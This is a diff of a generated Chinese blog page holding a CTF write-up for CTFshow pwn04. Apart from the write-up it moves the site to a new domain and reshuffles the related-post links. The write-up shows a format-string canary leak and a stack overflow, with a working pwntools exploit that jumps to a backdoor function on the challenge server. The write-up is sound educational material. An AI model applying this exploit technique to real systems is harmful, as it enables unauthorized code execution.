@@ -16,9 +16,9 @@
   <meta http-equiv="Cache-Control" content="no-siteapp">
 
 
-<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
-<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
-<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://g01den1.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://g01den1.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://g01den1.github.io/feed.json" />
 
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
 
@@ -28,7 +28,7 @@
   <meta name="keywords" content="Pwn" />
 
 
-<link rel="canonical" href="http://blog.g01den.top/posts/9b0d93f7.html">
+<link rel="canonical" href="http://g01den1.github.io/posts/9b0d93f7.html">
 
 
 
@@ -132,7 +132,7 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
-  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/9b0d93f7.html">
+  <link itemprop="mainEntityOfPage" href="http://g01den1.github.io/posts/9b0d93f7.html">
 
   <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="image" content="/images/avatar.jpg">
@@ -147,27 +147,24 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h2 id="1、CTFshow-pwn04（基础canary）"><a href="#1、CTFshow-pwn04（基础canary）" class="headerlink" title="1、CTFshow-pwn04（基础canary）"></a>1、CTFshow-pwn04（基础canary）</h2><p>​		好久没碰过pwn了，今天临时做一道吧，毕竟刚联合了WSL和VSCode，想着试着做一道题看看，结果随手一点，就是一个很少接触的，拿来刷刷：</p>
+    <h2 id="1-ctfshow-pwn04基础canary"><a class="markdownIt-Anchor" href="#1-ctfshow-pwn04基础canary">#</a> 1、CTFshow-pwn04（基础 canary）</h2>
+<p>​		好久没碰过 pwn 了，今天临时做一道吧，毕竟刚联合了 WSL 和 VSCode，想着试着做一道题看看，结果随手一点，就是一个很少接触的，拿来刷刷：</p>
 <p>​		先查看下保护：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@MSI:/home/g01den/Temp<span class="comment"># checksec pwn</span></span><br><span class="line">[*] <span class="string">&#x27;/home/g01den/Temp/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<p>​		除了NX之外，似乎就只有 Canary了。反编译看看：</p>
-<p>​		有用的只有vuln函数：</p>
+<p>​		除了 NX 之外，似乎就只有 Canary 了。反编译看看：</p>
+<p>​		有用的只有 vuln 函数：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+4h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​		发现了个事儿，for循环会执行两次，所以这里采用第一次不溢出，通过格式化字符串漏洞对Canary的值进行泄露，之后就可以在合适的地方填入canary的值来绕过canary保护了。</p>
+<p>​		发现了个事儿，for 循环会执行两次，所以这里采用第一次不溢出，通过格式化字符串漏洞对 Canary 的值进行泄露，之后就可以在合适的地方填入 canary 的值来绕过 canary 保护了。</p>
 <p>​		因此，思路就很明确了。</p>
-<p>​		之后通过disass vuln 查看汇编代码，发现了重要的一个内容，它在 ret 之前进行了一次异或，且指定的内存为[ebp-0xc]：</p>
+<p>​		之后通过 disass vuln 查看汇编代码，发现了重要的一个内容，它在 ret 之前进行了一次异或，且指定的内存为 [ebp-0xc]：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x08048677 &lt;+73&gt;:    nop</span><br><span class="line">0x08048678 &lt;+74&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">0x0804867b &lt;+77&gt;:    xor    eax,DWORD PTR gs:0x14</span><br><span class="line">0x08048682 &lt;+84&gt;:    je     0x8048689 &lt;vuln+91&gt;</span><br><span class="line">0x08048684 &lt;+86&gt;:    call   0x8048450 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x08048689 &lt;+91&gt;:    leave  </span><br><span class="line">0x0804868a &lt;+92&gt;:    ret </span><br></pre></td></tr></table></figure>
-
-<p>​		由此可知，cannary存放的地址就是[ebp-0xc]，看一下：</p>
+<p>​		由此可知，cannary 存放的地址就是 [ebp-0xc]，看一下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1f:007c│-00c 0xffffd56c ◂— 0x7493ea00</span><br><span class="line">20:0080│-008 0xffffd570 —▸ 0x8048768 ◂— dec eax /* <span class="string">&#x27;Hello Hacker!&#x27;</span> */</span><br><span class="line">21:0084│-004 0xffffd574 ◂— 0xa0000</span><br><span class="line">22:0088│ ebp 0xffffd578 —▸ 0xffffd598 ◂— 0</span><br></pre></td></tr></table></figure>
-
-<p>​		目测cannary的值为0x7493ea00，那么， 想要泄露这个值，需要使用格式化字符串来泄露，那么，来判断下对不对吧，我们输入%31$x即可泄露：</p>
+<p>​		目测 cannary 的值为 0x7493ea00，那么， 想要泄露这个值，需要使用格式化字符串来泄露，那么，来判断下对不对吧，我们输入 %31$x 即可泄露：</p>
 <p><img data-src="https://img-blog.csdnimg.cn/direct/da9f516fdace47a5a69b947210919c38.png#pic_center" alt="在这里插入图片描述"></p>
-<p>​		根据这俩进行计算，可得到偏移，结果是0x7c&#x2F;4&#x3D;31。</p>
-<p>​		之后就是具体进行溢出了，计算溢出的长度也比较简单，这里直接上答案吧，116字节，不过，第100到104为canary的值。</p>
-<p>​		由于存在后门函数，所以exp如下：</p>
+<p>​		根据这俩进行计算，可得到偏移，结果是 0x7c/4=31。</p>
+<p>​		之后就是具体进行溢出了，计算溢出的长度也比较简单，这里直接上答案吧，116 字节，不过，第 100 到 104 为 canary 的值。</p>
+<p>​		由于存在后门函数，所以 exp 如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28203</span>)</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload1 = <span class="string">b&quot;%31$x&quot;</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">getshell_addr = <span class="number">0x0804859B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">100</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + p32(getshell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
       <div class="tags">
@@ -219,7 +216,7 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://blog.g01den.top/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">http://blog.g01den.top/posts/9b0d93f7.html</a>
+    <a href="http://g01den1.github.io/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">http://g01den1.github.io/posts/9b0d93f7.html</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -270,7 +267,7 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81CTFshow-pwn04%EF%BC%88%E5%9F%BA%E7%A1%80canary%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">1、CTFshow-pwn04（基础canary）</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-ctfshow-pwn04%E5%9F%BA%E7%A1%80canary"><span class="toc-number">1.</span> <span class="toc-text"> 1、CTFshow-pwn04（基础 canary）</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
@@ -384,50 +381,30 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
 </div>
 
-    <span><a href="/posts/384200ef.html" title="SQL无列名注入">SQL无列名注入</a></span>
+    <span><a href="/posts/70a9569d.html" title="记录第一次SpringBoot开发的失败经历">记录第一次SpringBoot开发的失败经历</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行">ctfshow-命令执行</a></span>
+    <span><a href="/posts/efb4c08.html" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
 </div>
 
-    <span><a href="/posts/fe4eec6d.html" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
-</div>
-
-    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
-</div>
-
-    <span><a href="/posts/955175a5.html" title="【2024】H&amp;NCTF">【2024】H&NCTF</a></span>
+    <span><a href="/posts/27a95d1a.html" title="hexo部署服务器">hexo部署服务器</a></span>
   </li>
 
       
@@ -444,6 +421,26 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/9dd9bec.html" title="Ciscn2024">Ciscn2024</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/Misc/" title="分类于 杂七杂八的知识点">杂七杂八的知识点</a>
 </div>
 
@@ -454,32 +451,30 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/posts/666fe8df.html" title="【2024】强网杯">【2024】强网杯</a></span>
+    <span><a href="/posts/d1a08bca.html" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/posts/ef2fddc9.html" title="arcaea闲谈">arcaea闲谈</a></span>
+    <span><a href="/posts/e20e7502.html" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/posts/2c763aa6.html" title="数据结构-3、栈、队列和数组">数据结构-3、栈、队列和数组</a></span>
+    <span><a href="/posts/c06afb6e.html" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></span>
   </li>
 
   </ul>
